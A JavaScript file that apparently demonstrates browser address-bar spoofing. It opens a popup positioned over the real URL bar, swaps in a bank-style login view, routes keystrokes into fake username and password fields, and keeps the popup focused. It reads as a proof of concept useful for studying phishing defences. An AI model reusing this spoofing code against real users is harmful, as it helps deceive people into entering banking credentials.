let win = null

interceptUserInput(() => {
  if (win && win.closed) win = null
  if (win) return win.focus()
})

document.querySelector('#boalink').addEventListener('click', start)

const $username = document.querySelector('#username')
const $password = document.querySelector('#password')
let $focusedElem = $username

$username.addEventListener('focus', () => { $focusedElem = $username })
$password.addEventListener('focus', () => { $focusedElem = $password })

window.addEventListener('message', ({ data }) => {
  if (data.key === 'Tab') {
    if ($focusedElem === $username) {
      $password.focus()
      $focusedElem = $password
    } else if ($focusedElem === $password) {
      $username.focus()
      $focusedElem = $username
    }
  } else if (data.key === 'Backspace') {
    $focusedElem.value = $focusedElem.value.slice(0, -1)
  } else if (data.key.length === 1) { // letter
    $focusedElem.value += $focusedElem === $username ? data.key : '•'
  }
})

/**
 * Intercept all user-initiated events and call the given the function, `onInput`.
 */
function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

/**
 * Open a new popup window. Requires user-initiated event.
 */
function openWindow (
  url = window.location.pathname, x = 0, y = 0, width = 100, height = 100
) {
  const opts = `width=${width},height=${height},left=${x},top=${y}`
  const _win = window.open(url, '', opts)

  // New windows may be blocked by the popup blocker
  if (!_win) return
  win = _win
  return win
}

function start (e) {
  e.preventDefault()
  e.stopPropagation()
  const x = window.screenX + 1
  const y = window.screenY - 114
  const width = window.innerWidth - 14
  const height = 100
  openWindow('pop.html', x, y, width, height)
  document.querySelector('.lifehacker').classList.add('dn')
  document.querySelector('.boa').classList.remove('dn')
  document.documentElement.scrollTop = 0
}
